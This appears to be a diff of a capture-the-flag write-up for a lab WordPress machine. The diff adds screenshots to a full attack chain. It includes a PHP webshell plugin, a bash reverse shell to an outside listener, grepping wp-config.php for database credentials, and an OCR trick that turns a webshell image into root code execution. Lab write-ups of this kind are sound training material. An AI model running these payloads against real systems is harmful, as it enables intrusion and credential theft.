@@ -47,12 +47,15 @@ nmap -Pn -sV -sC 10.129.246.24
 ```
 
 SSH (22) and HTTP/HTTPS are open, and the web server redirects to a hostname. Add it to the hosts file so name-based routing works:
+<img width="720" height="418" alt="image" src="https://github.com/user-attachments/assets/e4386701-e84b-4646-8041-223489142114" />
+
 
 ```bash
 echo "10.129.196.131 makesense.htb" | sudo tee -a /etc/hosts
 ```
 
-<div class="shot">nmap -sV -sC output and the /etc/hosts entry.</div>
+<img width="558" height="83" alt="image" src="https://github.com/user-attachments/assets/50e1d314-777f-4898-9566-2448e1965371" />
+
 
 ## 2. Enumeration
 
@@ -67,7 +70,10 @@ feroxbuster -k -u https://makesense.htb/ \
 
 The results are a textbook WordPress layout — `wp-content`, `wp-admin`, `wp-includes`, `xmlrpc.php` — plus a custom `webagency` theme. The host is no longer an anonymous server; it's a known application, and every step after this is targeted.
 
-<div class="shot">feroxbuster hits showing the wp-* directories.</div>
+<img width="720" height="589" alt="image" src="https://github.com/user-attachments/assets/6c30af88-84f1-4253-a953-097980962609" />
+
+<img width="720" height="889" alt="image" src="https://github.com/user-attachments/assets/a1e114ed-68c5-4a9b-92fe-8988e48fef4e" />
+
 
 ### 2.2 Fingerprinting — never skip this
 
@@ -76,6 +82,9 @@ Before choosing any angle, confirm exactly what WordPress is running:
 ```bash
 wpscan --url https://makesense.htb --disable-tls-checks -v
 ```
+
+<img width="720" height="379" alt="image" src="https://github.com/user-attachments/assets/667348fc-fd8d-49f0-8adf-232b8c217f84" />
+
 
 Key findings:
 
@@ -86,7 +95,10 @@ Key findings:
 
 That last line is the opening — a misconfiguration, not a CVE.
 
-<div class="shot">wpscan output highlighting the version, theme, and "Upload directory has listing enabled".</div>
+<img width="720" height="847" alt="image" src="https://github.com/user-attachments/assets/c39baead-6ff2-4761-b766-49fc80db3565" />
+
+<img width="720" height="429" alt="image" src="https://github.com/user-attachments/assets/733b05ed-0edc-4efe-9fe4-56e7f3e4b05c" />
+
 
 ### 2.3 User enumeration
 
@@ -98,7 +110,8 @@ curl -k -s "https://makesense.htb/index.php?rest_route=/wp/v2/users" | jq
 
 We get `admin`, whose `url` field points to `http://localhost:8000` — a hint that something is bound locally that we'll care about later. XML-RPC also answers `system.listMethods`, confirming the pingback and `wp.*`/`metaWeblog.*` method set is live — worth noting, but the real lead is the open uploads folder.
 
-<div class="shot">the REST API users response showing admin and the localhost:8000 url.</div>
+<img width="720" height="359" alt="image" src="https://github.com/user-attachments/assets/819a5fd5-7f06-4449-84d1-43a74a81c4e8" />
+
 
 ## 3. Gaining Access
 
@@ -114,6 +127,9 @@ for m in 01 05 06 07 11; do
 done
 ```
 
+<img width="646" height="205" alt="image" src="https://github.com/user-attachments/assets/531915a4-0a62-4544-93c3-cf9bf7e383d7" />
+
+
 Under `/wp-content/uploads/2026/` there's a `voice-message.wav`. Download it and listen — the recording reads out a set of credentials:
 
 ```text
@@ -122,7 +138,11 @@ jake : ClearLightNiceSmooth4923
 
 Those log straight into `wp-admin`.
 
-<div class="shot">the uploads directory listing with voice-message.wav, and the wp-admin dashboard as jake.</div>
+<img width="657" height="414" alt="image" src="https://github.com/user-attachments/assets/a9216a22-ad53-4e88-b212-2bc423e7ba6b" />
+
+<img width="596" height="333" alt="image" src="https://github.com/user-attachments/assets/6bcd9ce5-21e0-4558-8737-f99c4690352b" />
+
+
 
 ### 3.2 Reading the theme source — the real vulnerability
 
@@ -206,11 +226,20 @@ curl -k -s -X POST https://makesense.htb/wp-admin/admin-ajax.php \
 
 Keep a listener running for the callback, give the admin review bot 60–90 seconds, and the `pwned123` administrator now exists.
 
-<div class="shot">the forged payload being submitted and the callback / new admin user in the Users list.</div>
+<img width="700" height="756" alt="image" src="https://github.com/user-attachments/assets/7ced5eb6-3c47-4262-bfd2-bba9ec08e5d3" />
+
+<img width="720" height="715" alt="image" src="https://github.com/user-attachments/assets/00ac10d5-f6fa-4541-9921-818c1891958c" />
+
+
 
 ### 3.4 Admin → RCE via malicious plugin
 
 Log in as the new admin and build a one-file plugin that executes commands:
+
+<img width="720" height="396" alt="image" src="https://github.com/user-attachments/assets/985449bf-8847-4037-8171-fc0ee8f01014" />
+
+<img width="720" height="377" alt="image" src="https://github.com/user-attachments/assets/16524aed-a0f4-4171-9249-c8f4c9898ee7" />
+
 
 ```php
 <?php
@@ -222,6 +251,7 @@ Log in as the new admin and build a one-file plugin that executes commands:
 if (isset($_GET['c'])) { echo '<pre>' . shell_exec($_GET['c']) . '</pre>'; }
 ```
 
+
 Zip it and upload through **Plugins → Add New → Upload Plugin**. (The scripted upload fought me on the nonce, so the browser UI was the path of least resistance.) Activate it, then hit the webshell:
 
 ```bash
@@ -229,13 +259,26 @@ curl -k -s "https://makesense.htb/wp-content/plugins/pwned/pwned.php?c=id"
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
+<img width="720" height="465" alt="image" src="https://github.com/user-attachments/assets/77f44c21-d86c-47d7-8b72-44489d458332" />
+
+<img width="720" height="379" alt="image" src="https://github.com/user-attachments/assets/80c0cb34-83e1-4d2f-a2c0-fd5448a8f56f" />
+
+
 A reverse shell makes it comfortable:
 
 ```bash
 curl -k -s "https://makesense.htb/wp-content/plugins/pwned/pwned.php?c=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.17.244/4444%200>%261'"
 ```
 
-<div class="shot">id returning www-data and the reverse shell catching on the listener.</div>
+then 
+
+<img width="720" height="909" alt="image" src="https://github.com/user-attachments/assets/b1ef871f-dfcc-49ab-9fd2-bf82345af92a" />
+
+I searched more until I reached this path
+
+<img width="720" height="848" alt="image" src="https://github.com/user-attachments/assets/e5c655b9-1b81-49d8-88ea-268f22ef7306" />
+
+
 
 ## 4. Lateral Movement & Proof
 
@@ -244,6 +287,9 @@ Loot the WordPress config for database credentials:
 ```bash
 grep -E 'DB_USER|DB_PASSWORD|DB_NAME' /var/www/html/wp-config.php
 ```
+
+<img width="720" height="258" alt="image" src="https://github.com/user-attachments/assets/5eec2585-9072-469f-9c66-06aab4e31619" />
+
 
 The DB password is reused by a real system user — check `/etc/passwd` for accounts with shells and `walter` turns up:
 
@@ -261,17 +307,43 @@ cat /home/walter/user.txt
 
 `user.txt` is done. ✅
 
-<div class="shot">wp-config.php creds, /etc/passwd, and the SSH session reading user.txt.</div>
+<img width="592" height="640" alt="image" src="https://github.com/user-attachments/assets/42600cea-d434-41d9-a45d-53d63d96e9fd" />
+
+
 
 ## 5. Privilege Escalation — the OCR service
 
+I ran parsing peas tool
+
+
+<img width="720" height="496" alt="image" src="https://github.com/user-attachments/assets/10fb07a2-62b9-47ae-ad76-116ccbf9f371" />
+
+<img width="720" height="648" alt="image" src="https://github.com/user-attachments/assets/546191b8-8777-47b8-9c8a-58ed52820398" />
+
+
+
 As walter there's an internal service bound to localhost on port 8001. Forward it so I can reach it locally:
+
+<img width="720" height="378" alt="image" src="https://github.com/user-attachments/assets/4fea83d1-dc8a-4fb0-88da-7f80e6c94242" />
+
 
 ```bash
 ssh -L 8001:127.0.0.1:8001 walter@10.129.246.24
 ```
 
+<img width="720" height="400" alt="image" src="https://github.com/user-attachments/assets/57f07237-0bbb-44c9-925a-3b48b8f858f5" />
+
+
 It's a web app that takes a canvas image, runs OCR on it, and saves the recognized text to a file whose name you control. If I can make OCR "read" PHP source and save it as a `.php` file in the web root, that's code execution as whatever user runs the service. So I render a PHP webshell *as an image* and let OCR transcribe it back into text:
+
+<img width="720" height="374" alt="image" src="https://github.com/user-attachments/assets/66c0341d-428c-4a1d-aa8f-e9c00510f197" />
+
+<img width="720" height="374" alt="image" src="https://github.com/user-attachments/assets/503b71f5-5a45-4f9f-93de-76c55214fe0c" />
+
+<img width="720" height="380" alt="image" src="https://github.com/user-attachments/assets/7e0a5b80-a75f-4191-94f3-bd69c709b798" />
+
+<img width="720" height="398" alt="image" src="https://github.com/user-attachments/assets/4b14bd43-32a4-4aab-a216-9f196308e4dd" />
+
 
 ```python
 from PIL import Image, ImageDraw, ImageFont
@@ -288,6 +360,11 @@ draw = ImageDraw.Draw(img)
 draw.text((20-bb[0], 20-bb[1]), PAYLOAD, fill='black', font=font)
 img.save('/tmp/shell.png')
 ```
+
+<img width="344" height="113" alt="image" src="https://github.com/user-attachments/assets/b7c3f61c-ab88-4b0f-b9e6-afb3ea03217c" />
+
+<img width="720" height="588" alt="image" src="https://github.com/user-attachments/assets/d021ca3d-04ba-4240-bac8-82cfe6635226" />
+
 
 Submit the image, grab the returned `ocr_id`, save it under a `.php` filename, and execute:
 
@@ -309,7 +386,12 @@ curl -s -u "$AUTH" "http://localhost:8001/saved/shell.php?c=id"
 
 The service runs as root, so the webshell executes as root — read `root.txt` and the box is done. 🔓
 
-<div class="shot">the OCR image, the saved shell.php, and id returning root.</div>
+<img width="720" height="757" alt="image" src="https://github.com/user-attachments/assets/d344b439-9a65-4101-8591-ecc79af8de11" />
+
+<img width="686" height="961" alt="image" src="https://github.com/user-attachments/assets/bb7936dc-412b-4730-99d0-4729052c16e2" />
+
+<img width="717" height="665" alt="image" src="https://github.com/user-attachments/assets/032ba143-1b5d-4aac-97f6-b32a810bc8e1" />
+
 
 ## 6. Remediation
 
